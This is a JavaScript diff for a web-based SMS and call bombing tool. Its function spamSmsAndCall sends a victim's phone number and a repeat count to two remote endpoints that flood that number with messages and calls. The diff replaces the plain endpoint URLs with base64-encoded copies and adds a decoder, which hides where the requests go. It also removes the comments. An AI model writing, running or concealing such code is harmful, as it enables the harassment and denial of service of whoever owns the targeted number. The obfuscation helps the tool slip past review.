@@ -1,11 +1,9 @@
 let queue = [];
 let processing = false;
 
-// List of URLs
 const urls = [
-    'https://quang.nqtool.net/?',
-    'https://quang.nqtool.net/index4.php?'
-    // Add more URLs as needed
+    'aHR0cHM6Ly9xdWFuZy5ucXRvb2wubmV0Lz8=',
+    'aHR0cHM6Ly9xdWFuZy5ucXRvb2wubmV0L2luZGV4NC5waHA/'
 ];
 
 function addToQueue() {
@@ -38,30 +36,30 @@ function processQueue() {
 }
 
 function spamSmsAndCall(phone, times, listItem) {
-    // Create URLs for both API requests
-    const url1 = `${urls[0]}phone=${phone}&amout=${times}`;
-    const url2 = `${urls[1]}phone=${phone}&amout=${times}`;
+    const url1 = decodeBase64(urls[0]) + `phone=${phone}&amout=${times}`;
+    const url2 = decodeBase64(urls[1]) + `phone=${phone}&amout=${times}`;
 
-    // Fetch both URLs simultaneously
     Promise.all([
         fetch(url1).then(response => response.json()),
         fetch(url2).then(response => response.json())
     ])
     .then(([response1, response2]) => {
-        // Combine results from both URLs
         listItem.innerText = `Thành Công ${phone}: URL1 - ${response1.message}, URL2 - ${response2.message}`;
         processQueue();
     })
     .catch(error => {
-        // Handle error case
         listItem.innerText = `Thất Bại ${phone}`;
         processQueue();
     });
 }
 
+function decodeBase64(encoded) {
+    return atob(encoded);
+}
+
 function updateStatusBar() {
     const statusList = document.getElementById('status-list');
-    statusList.innerHTML = ''; // Clear the list
+    statusList.innerHTML = '';
     queue.forEach((item, index) => {
         const listItem = document.createElement('li');
         listItem.innerText = `Luồng: ${item.phone} (${item.times} times)`;
